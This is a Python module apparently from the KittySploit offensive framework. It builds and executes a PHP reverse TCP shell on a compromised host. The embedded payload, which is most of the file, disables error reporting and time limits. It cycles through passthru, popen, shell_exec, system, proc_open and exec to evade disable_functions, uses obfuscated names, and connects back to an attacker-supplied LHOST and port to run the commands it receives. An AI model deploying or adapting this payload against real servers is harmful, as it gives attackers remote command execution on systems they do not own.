from kittysploit import *
from lib.exploit.handler import Reverse

class Module(Post, Reverse):

	__info__ = {
		"name": "Reverse TCP shell",
		"description": "Reverse TCP shell in PHP using a reverse handler",
		"author": "KittySploit Team",
		"arch": Arch.PHP,
	}
		
	def run(self):
		# Start reverse handler
		if not self.start_handler():
			return False
		
		# Wait a moment for listener to start
		import time
		time.sleep(1)
		
		
		data = rf"""
      @error_reporting(0);
      @set_time_limit(0); @ignore_user_abort(1); @ini_set('max_execution_time',0);
      $dis=@ini_get('disable_functions');
      if(!empty($dis)){{
        $dis=preg_replace('/[, ]+/', ',', $dis);
        $dis=explode(',', $dis);
        $dis=array_map('trim', $dis);
      }}else{{
        $dis=array();
      }}
      var_dump($dis);
      
    $ipaddr='LHOST_PLACEHOLDER';
    $port=LPORT_PLACEHOLDER;

    if(!function_exists('KtKEFza')){{
      function KtKEFza($c){{
        global $dis;
        
      if (FALSE !== strpos(strtolower(PHP_OS), 'win' )) {{
        $c=$c." 2>&1\n";
      }}
      $LzqO='is_callable';
      $TwsZz='in_array';
      
      if($LzqO('passthru')and!$TwsZz('passthru',$dis)){{
        ob_start();
        passthru($c);
        $o=ob_get_contents();
        ob_end_clean();
      }}else
      if($LzqO('popen')and!$TwsZz('popen',$dis)){{
        $fp=popen($c,'r');
        $o=NULL;
        if(is_resource($fp)){{
          while(!feof($fp)){{
            $o.=fread($fp,1024);
          }}
        }}
        @pclose($fp);
      }}else
      if($LzqO('shell_exec')and!$TwsZz('shell_exec',$dis)){{
        $o=shell_exec($c);
      }}else
      if($LzqO('system')and!$TwsZz('system',$dis)){{
        ob_start();
        system($c);
        $o=ob_get_contents();
        ob_end_clean();
      }}else
      if($LzqO('proc_open')and!$TwsZz('proc_open',$dis)){{
        $handle=proc_open($c,array(array('pipe','r'),array('pipe','w'),array('pipe','w')),$pipes);
        $o=NULL;
        while(!feof($pipes[1])){{
          $o.=fread($pipes[1],1024);
        }}
        @proc_close($handle);
      }}else
      if($LzqO('exec')and!$TwsZz('exec',$dis)){{
        $o=array();
        exec($c,$o);
        $o=join(chr(10),$o).chr(10);
      }}else
      {{
        $o=0;
      }}
    
        return $o;
      }}
    }}
    $nofuncs='no exec functions';
    if(is_callable('fsockopen')and!in_array('fsockopen',$dis)){{
      $s=@fsockopen("tcp://".$ipaddr,$port);
      while($c=fread($s,2048)){{
        $out = '';
        if(substr($c,0,3) == 'cd '){{
          chdir(substr($c,3,-1));
        }} else if (substr($c,0,4) == 'quit' || substr($c,0,4) == 'exit') {{
          break;
        }}else{{
          $out=KtKEFza(substr($c,0,-1));
          if($out===false){{
            fwrite($s,$nofuncs);
            break;
          }}
        }}
        fwrite($s,$out);
      }}
      fclose($s);
    }}else{{
      $s=@socket_create(AF_INET,SOCK_STREAM,SOL_TCP);
      @socket_connect($s,$ipaddr,$port);
      @socket_write($s,"socket_create");
      while($c=@socket_read($s,2048)){{
        $out = '';
        if(substr($c,0,3) == 'cd '){{
          chdir(substr($c,3,-1));
        }} else if (substr($c,0,4) == 'quit' || substr($c,0,4) == 'exit') {{
          break;
        }}else{{
          $out=KtKEFza(substr($c,0,-1));
          if($out===false){{
            @socket_write($s,$nofuncs);
            break;
          }}
        }}
        @socket_write($s,$out,strlen($out));
      }}
      @socket_close($s);
    }}

"""
		# Replace placeholders with actual values
		data = data.replace("LHOST_PLACEHOLDER", self.lhost)
		data = data.replace("LPORT_PLACEHOLDER", str(self.lport))
		
		# Execute PHP code
		print_info("Executing reverse shell payload...")
		self.cmd_execute(data)
		
		# Wait a bit for connection
		time.sleep(2)
		
		return True
